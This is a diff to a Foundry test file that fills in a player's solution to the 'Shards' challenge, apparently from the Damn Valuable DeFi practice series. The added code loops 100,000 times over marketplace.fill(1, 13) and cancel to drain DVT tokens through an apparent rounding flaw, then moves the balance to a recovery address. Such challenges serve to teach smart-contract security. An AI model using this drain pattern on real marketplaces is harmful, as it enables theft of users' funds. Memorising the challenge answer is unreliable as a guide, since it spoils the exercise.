@@ -10,6 +10,7 @@ import {
     DamnValuableToken,
     DamnValuableNFT
 } from "../../src/shards/ShardsNFTMarketplace.sol";
+import {IShardsNFTMarketplace} from "../../src/shards/IShardsNFTMarketplace.sol";
 import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";
 
 contract ShardsChallenge is Test {
@@ -114,7 +115,16 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        // Test buying shards
+        IShardsNFTMarketplace.Offer memory onlyOffer = marketplace.getOffer(1);
+        console.log("Offer: %s", onlyOffer.totalShards);
+        console.log("Player DVT balance 1", token.balanceOf(player));
+        for (uint256 i = 0; i < 100_000; i++) {
+            uint256 purchaseIndex = marketplace.fill(1, 13);
+            marketplace.cancel(1, purchaseIndex);
+        }
+        console.log("Player DVT balance 3", token.balanceOf(player));
+        token.transfer(recovery, token.balanceOf(player));
     }
 
     /**
